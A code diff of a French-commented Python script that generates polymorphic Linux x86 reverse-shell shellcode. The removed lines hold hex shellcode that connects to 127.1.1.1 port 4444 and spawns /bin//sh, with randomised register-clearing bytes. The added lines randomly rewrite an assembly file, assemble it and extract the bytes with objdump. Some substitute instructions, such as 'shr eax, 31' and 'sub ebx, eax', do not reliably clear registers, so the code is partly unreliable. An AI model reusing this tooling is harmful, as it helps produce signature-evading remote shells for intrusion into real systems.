@@ -1,55 +1,71 @@
 import random
-from _socket import htons
+import os
+
+def main():
+    file = 'reverse.asm'
+    file_o = 'reverse.o'
+    eax(file)
+    ebx(file)
+    ecx(file)
+    edx(file)
+
+    os.system("nasm -f elf32 -o reverse.o reverse.asm && ld -m elf_i386 -o reverse reverse.o")
+
+    commande = 'objdump -d reverse | grep "^ " | cut -f2 | awk \'{for(i=1;i<=NF;i++) printf "\\\\x%s",$i} END {print ""}\' >> result.txt'
+    os.system(commande)
+
+    print(os.system("cat result.txt"))
 
 
-def main():    #print(htons(127))
-    #shellcode = "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+def eax (file):
+    delete = '  xor eax, eax'
+    eax = ['  xor eax, eax', '  shr eax, 31', '  sub eax, eax', '  mov eax, 0xFFFFFFFF\n  add eax, 1']
+    new = eax
+    modifier_fichier(file, delete, new)
 
-    #Assemblage du shellcode
-    shellcode = random_eax_clear() + random_ebx_clear() + "\\xb0\\x66\\xb3\\x01" + random_edx_clear() + "\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x03\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80" + random_ecx_clear() + random_eax_clear() + "\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf0" + random_eax_clear() + "\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" + random_ecx_clear() + "\\xcd\\x80"
+def ebx(file):
+    delete = '  xor ebx, ebx'
+    ebx = ['  xor ebx, ebx', '  shr ebx, 31', '  sub ebx, eax', '  mov ebx, 0xFFFFFFFF\n  add ebx, 1']
+    new = ebx
+    modifier_fichier(file, delete, new)
 
-    #Affichage
-    print("Shellcode bytes size: %d" % (len(shellcode) / 4))
-    print(shellcode)
+def ecx(file):
+    delete = '  xor ecx, ecx'
+    ecx = ['  xor ecx, ecx', '  shr ecx, 31', '  sub ecx, ecx', '  mov ecx, 0xFFFFFFFF\n  add ecx, 1']
+    new = ecx
+    modifier_fichier(file, delete, new)
 
-def random_eax_clear():
-    #Choisit aléatoirement l'une des alternatives pour réinitialiser le registre choisit et renvoie les bytes correspondants
-
-    eax_clear_array = ["\\x31\\xc0", "\\x29\\xC0"]
-    random_element = random.randrange(0, len(eax_clear_array))
-    print("eax random:%d" % random_element)
-    
-    return eax_clear_array[random_element]
-
-
-def random_ebx_clear():
-    # Choisit aléatoirement l'une des alternatives pour réinitialiser le registre choisit et renvoie les bytes correspondants
-
-    ebx_clear_array = ["\\x31\\xDB", "\\x29\\xDB"]
-    random_element = random.randrange(0, len(ebx_clear_array))
-    print("ebx random:%d" % random_element)
-
-    return ebx_clear_array[random_element]
-
-def random_ecx_clear():
-    # Choisit aléatoirement l'une des alternatives pour réinitialiser le registre choisit et renvoie les bytes correspondants
-
-    ecx_clear_array = ["\\x31\\xC9", "\\x29\\xC9"]
-    random_element = random.randrange(0, len(ecx_clear_array))
-    print("ecx random:%d" % random_element)
-
-    return ecx_clear_array[random_element]
-
-def random_edx_clear():
-    # Choisit aléatoirement l'une des alternatives pour réinitialiser le registre choisit et renvoie les bytes correspondants
-
-    edx_clear_array = ["\\x31\\xD2", "\\x29\\xD2"]
-    random_element = random.randrange(0, len(edx_clear_array))
-    print("edx random:%d" % random_element)
-
-    return edx_clear_array[random_element]
+def edx(file):
+    delete = '  xor edx, edx'
+    edx = ['  xor edx, edx', '  shr edx, 31', '  sub edx, edx', '  mov edx, 0xFFFFFFFF\n  add edx, 1']
+    new = edx
+    modifier_fichier(file, delete, new)
 
 
+
+def modifier_fichier(nom_fichier, ligne_a_supprimer, nouvelle_ligne):
+    try:
+        with open(nom_fichier, 'r') as fichier:
+            lignes = fichier.readlines()
+
+        # Recherche de toutes les occurrences de la ligne à supprimer
+        indices_a_supprimer = [i for i, ligne in enumerate(lignes) if ligne.strip() == ligne_a_supprimer.strip()]
+
+        # Modification de toutes les occurrences
+        for indice in reversed(indices_a_supprimer):
+            del lignes[indice]
+            rand = random.randint(0, len(nouvelle_ligne)-1)
+            lignes.insert(indice, nouvelle_ligne[rand] + '\n')
+
+        # Écriture du fichier modifié
+        with open(nom_fichier, 'w') as fichier:
+            fichier.writelines(lignes)
+
+        print("Modification du fichier réussie.")
+    except FileNotFoundError:
+        print(f"Le fichier '{nom_fichier}' n'a pas été trouvé.")
+    except Exception as e:
+        print(f"Une erreur s'est produite : {e}")
 
 if __name__ == '__main__':
     main()
